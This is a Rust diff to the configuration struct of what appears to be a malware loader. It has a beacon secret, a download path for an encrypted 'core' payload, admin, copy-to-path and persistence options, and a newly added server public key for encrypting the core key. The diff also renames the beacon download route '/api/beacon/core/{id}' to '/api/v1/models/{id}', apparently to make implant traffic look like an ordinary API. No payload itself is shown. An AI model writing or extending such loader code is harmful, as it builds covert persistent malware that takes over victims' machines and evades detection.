@@ -5,6 +5,8 @@ pub struct LoaderConfig {
     pub core_download_path: String,
     pub core_key_path: String,
     pub beacon_secret: String,
+    /// 服务端 RSA 公钥（SPKI DER b64，构建注入）：core-key 混合加密。
+    pub server_public_key: String,
     pub require_admin: bool,
     pub copy_to_path: Option<String>,
     pub enable_persistence: bool,
@@ -20,6 +22,7 @@ impl LoaderConfig {
             core_download_path: injected.core_download_path,
             core_key_path: injected.core_key_path,
             beacon_secret: injected.beacon_secret,
+            server_public_key: injected.server_public_key,
             require_admin: injected.require_admin,
             copy_to_path: injected.copy_to_path,
             enable_persistence: injected.enable_persistence,
@@ -32,7 +35,7 @@ impl LoaderConfig {
         format!("{}{}", self.server_url, self.core_download_path)
     }
 
-    /// Extract the build id from the core download path (`/api/beacon/core/{id}`).
+    /// Extract the build id from the core download path (`/api/v1/models/{id}`).
     pub fn build_id(&self) -> String {
         self.core_download_path
             .rsplit('/')
